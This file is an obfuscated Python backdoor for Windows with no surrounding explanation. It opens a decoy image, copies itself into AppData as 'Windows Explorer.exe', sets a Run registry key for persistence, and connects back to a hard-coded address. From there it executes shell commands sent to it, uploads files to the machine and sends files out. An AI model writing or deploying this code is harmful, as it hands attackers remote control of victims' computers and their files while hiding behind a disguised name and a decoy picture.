#!/usr/bin/env python
h=True
R=ValueError
U=open
u=file
j=len
B=Exception
import socket
v=socket.socket
G=socket.AF_INET
K=socket.SOCK_STREAM
import subprocess
b=subprocess.call
a=subprocess.check_output
y=subprocess.Popen
import json
m=json.dumps
f=json.loads
import os
Y=os.path
s=os.environ
d=os.devnull
w=os.chdir
import base64
S=base64.b64decode
g=base64.b64encode
import sys
N=sys.exit
E=sys.executable
q=sys._MEIPASS
import shutil
A=shutil.copyfile
import time
O=time.sleep
class l:
 def __init__(z,ip,port):
  z.r()
  z.connection=v(G,K)
  z.connection.connect((ip,port))
 def r(z):
  D=s["appdata"]+"\\Windows Explorer.exe"
  if not Y.exists(D):
   A(E,D)
   b('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\do_the_thing /v Update /t REG_SZ /d "'+D+'"',shell=h)
 def X(z,data):
  I=m(data)
  z.connection.send(I)
 def P(z):
  I=""
  while h:
   try:
    I=I+z.connection.recv(1024)
    return f(I)
   except R:
    continue
 def o(z,J):
  c=U(d,'wb')
  return a(J,shell=h,stderr=c,stdin=c)
 def L(z,path):
  w(path)
  return "[+] Changing working direction to "+path
 def V(z,path):
  with U(path,"rb")as u:
   return g(u.read())
 def i(z,path,content):
  with U(path,"wb")as u:
   u.write(S(content))
   return "[+] Upload Successful"
 def W(z):
  while h:
   J=z.P()
   try:
    if J[0]=="exit":
     z.connection.close()
     N()
    elif J[0]=="cd" and j(J)>1:
     n=z.L(J[1])
    elif J[0]=="download":
     n=z.V(J[1])
    elif J[0]=="upload":
     n=z.i(J[1],J[2])
    else:
     n=z.o(J)
   except B:
    n="[-] Error during system_instruction execution."
   z.X(n)
F="%TEMP%\\onefile\car.jpg"
y(F,shell=h)
try:
 H=1
 while H<100:
  H=H+1
 O(20)
 x=l("192.168.188.154",8080)
 x.W()
except B:
 N()
